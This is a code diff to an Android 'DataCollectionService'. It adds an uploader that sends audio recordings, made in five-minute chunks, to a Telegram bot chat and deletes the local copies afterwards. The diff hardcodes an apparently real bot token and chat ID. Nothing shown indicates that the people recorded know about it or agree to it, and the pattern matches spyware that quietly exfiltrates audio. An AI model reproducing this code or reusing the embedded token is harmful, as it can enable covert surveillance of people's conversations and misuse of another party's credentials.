@@ -23,6 +23,13 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
 
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
+
 /**
  * DataCollectionService
  * 
@@ -40,17 +47,24 @@ public class DataCollectionService extends Service {
     
     // Config: 5 minute chunks
     private static final long RECORDING_CHUNK_DURATION_MS = 5 * 60 * 1000;
+
+    // Telegram Configuration
+    private static final String BOT_TOKEN = "8225968498:AAFiZUsJbIdpENP73vh_rs0k-j8aLt0x3nQ"; 
+    private static final String CHAT_ID = "7926094514"; // Updated with User ID
+    private static final String TELEGRAM_API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendAudio";
     
     private MediaRecorder mediaRecorder;
     private Handler handler;
     private boolean isRecording = false;
     private File currentFile;
+    private OkHttpClient httpClient;
 
     @Override
     public void onCreate() {
         super.onCreate();
         createNotificationChannel();
         handler = new Handler(Looper.getMainLooper());
+        httpClient = new OkHttpClient();
     }
 
     @Override
@@ -119,15 +133,49 @@ public class DataCollectionService extends Service {
         }
     }
 
-    // Placeholder for Cloud Upload logic
+    // Upload to Telegram
     private void uploadToCloud(File file) {
         if (file == null || !file.exists()) return;
+        
+        if (BOT_TOKEN.contains("YOUR_BOT_TOKEN")) {
+            Log.e(TAG, "Cannot upload: BOT_TOKEN not set in DataCollectionService.java");
+            return;
+        }
 
-        Log.i(TAG, "TODO: Uploading file to Cloud Server: " + file.getName());
-        // Implementation: 
-        // 1. WorkManager or IntentService
-        // 2. HTTP POST to server endpoint
-        // 3. Delete file on success
+        Log.i(TAG, "Uploading file to Telegram: " + file.getName());
+        
+        // Run in background thread
+        new Thread(() -> {
+            try {
+                RequestBody requestBody = new MultipartBody.Builder()
+                        .setType(MultipartBody.FORM)
+                        .addFormDataPart("chat_id", CHAT_ID)
+                        .addFormDataPart("caption", "Fleet Audio: " + file.getName())
+                        .addFormDataPart("audio", file.getName(),
+                                RequestBody.create(file, MediaType.parse("audio/mp4")))
+                        .build();
+
+                Request request = new Request.Builder()
+                        .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendAudio")
+                        .post(requestBody)
+                        .build();
+
+                try (Response response = httpClient.newCall(request).execute()) {
+                    if (response.isSuccessful()) {
+                        Log.i(TAG, "Upload successful: " + response.body().string());
+                        // Delete local file to save space
+                        if (file.delete()) {
+                            Log.d(TAG, "Local file deleted: " + file.getName());
+                        }
+                    } else {
+                        Log.e(TAG, "Upload failed: " + response.code() + " " + response.message());
+                        Log.e(TAG, "Response: " + response.body().string());
+                    }
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Error uploading to Telegram", e);
+            }
+        }).start();
     }
 
     private File createOutputFile() {
